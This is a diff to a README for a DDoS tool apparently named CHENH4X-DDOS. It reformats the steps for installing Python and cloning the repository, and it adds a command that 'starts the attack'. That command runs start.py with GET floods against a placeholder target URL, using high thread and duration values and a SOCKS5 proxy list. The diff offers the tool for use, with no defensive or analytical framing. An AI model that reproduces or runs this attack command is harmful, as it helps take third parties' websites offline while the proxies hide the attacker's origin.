@@ -49,7 +49,9 @@
   * 👑 HELP | Show Usge Script
 
 ## Usage
- * Install The Requirements first
- * ``sudo apt update && sudo apt install software-properties-common && sudo add-apt-repository ppa:deadsnakes/ppa && sudo apt update && sudo apt install python3.8 && python ––version``
- * After installing the requirements paste this on your terminal
- * ``git clone https://github.com/chenschmidt/CHENH4X-DDOS.git``
+* Install The Requirements first
+  * ``sudo apt update && sudo apt install software-properties-common && sudo add-apt-repository ppa:deadsnakes/ppa && sudo apt update && sudo apt install python3.8 && python ––version``
+* After installing the requirements paste this on your terminal
+  * ``git clone https://github.com/chenschmidt/CHENH4X-DDOS.git``
+* Then start the attack by this command
+  * ``cd CHENH4X-DDOS && apt install python3-pip && pip3 install -r requirements.txt && python3 start.py GET http://www.targetsite.com/ 5 1000 socks5.txt 9999 9999``
